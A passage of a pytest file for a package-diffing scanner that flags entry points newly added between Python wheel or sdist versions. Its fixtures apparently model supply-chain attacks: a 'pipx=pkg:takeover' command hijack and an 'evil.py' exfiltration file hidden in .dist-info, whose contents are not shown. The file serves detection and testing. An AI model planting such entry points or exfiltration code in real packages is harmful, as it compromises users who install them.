    # The file comparison still sees nothing: .dist-info remains excluded.
    assert result.files.added == ()
    assert result.files.changed == ()
    assert result.files.removed == ()

    assert [(finding.rule, finding.action, origin) for finding, origin in result.findings] == [
        ("baseline_new_entry_point", "REVIEW", "diff_new")
    ]
    assert result.findings[0][0].snippet == "console_scripts:pipx=pkg:takeover"


def test_the_entry_point_rule_action_mirrors_f8(tmp_path):
    assert DIFF_RULES["baseline_new_entry_point"].action == RULES["entry_point"].action


def test_an_unchanged_entry_point_is_carried_not_reported(tmp_path):
    # A version bump alone renames the .dist-info directory; that must not
    # look like a new entry point.
    result = pair(tmp_path, versioned("1.0.0", EP_ONE), versioned("2.0.0", EP_ONE))
    assert result.findings == ()
    assert [item.snippet for item in result.carried_evidence] == ["console_scripts:demo=pkg:main"]


def test_an_artifact_without_entry_points_reports_nothing(tmp_path):
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": CLEAN})
    assert result.findings == ()
    assert result.carried_evidence == ()


def test_a_removed_entry_point_is_not_reported(tmp_path):
    result = pair(tmp_path, versioned("1.0.0", EP_TWO), versioned("2.0.0", EP_ONE))
    assert result.findings == ()


def test_gui_scripts_are_compared_too(tmp_path):
    result = pair(
        tmp_path,
        versioned("1.0.0", EP_ONE),
        versioned("2.0.0", EP_ONE + "\n[gui_scripts]\nviewer = pkg:gui\n"),
    )
    assert [finding.snippet for finding, _ in result.findings] == ["gui_scripts:viewer=pkg:gui"]


def test_an_sdist_baseline_is_comparable_to_a_wheel_target(tmp_path):
    # The sdist declares scripts in pyproject.toml, the wheel in
    # entry_points.txt; parsing both to a canonical set bridges that.
    baseline = build_sdist(
        tmp_path / "demo-1.0.0.tar.gz",
        {"pkg/__init__.py": CLEAN, "pyproject.toml": PYPROJECT_ONE},
        prefix="demo-1.0.0",
    )
    artifact = build_wheel(tmp_path / "demo-2.0.0-py3-none-any.whl", versioned("2.0.0", EP_TWO))
    result = diff_against_baseline(baseline, artifact)
    assert [finding.snippet for finding, _ in result.findings] == [
        "console_scripts:pipx=pkg:takeover"
    ]
    assert [item.snippet for item in result.carried_evidence] == ["console_scripts:demo=pkg:main"]


def test_several_new_entry_points_are_reported_one_by_one_in_order(tmp_path):
    result = pair(
        tmp_path,
        versioned("1.0.0", EP_ONE),
        versioned("2.0.0", EP_ONE + "zzz = pkg:z\naaa = pkg:a\n"),
    )
    assert [finding.snippet for finding, _ in result.findings] == [
        "console_scripts:aaa=pkg:a",
        "console_scripts:zzz=pkg:z",
    ]


def test_the_finding_points_at_the_declaring_file(tmp_path):
    result = pair(tmp_path, versioned("1.0.0", EP_ONE), versioned("2.0.0", EP_TWO))
    assert result.findings[0][0].file == "demo-2.0.0.dist-info/entry_points.txt"


def test_dist_info_stays_excluded_from_the_file_comparison(tmp_path):
    # The exclusion rule is untouched: a hostile .py inside .dist-info is
    # still not diffed, even though entry points now are compared.
    result = pair(
        tmp_path,
        versioned("1.0.0", EP_ONE),
        {**versioned("2.0.0", EP_ONE), "demo-2.0.0.dist-info/evil.py": EXFILTRATE},
    )
    assert result.files.added == ()
    assert result.findings == ()
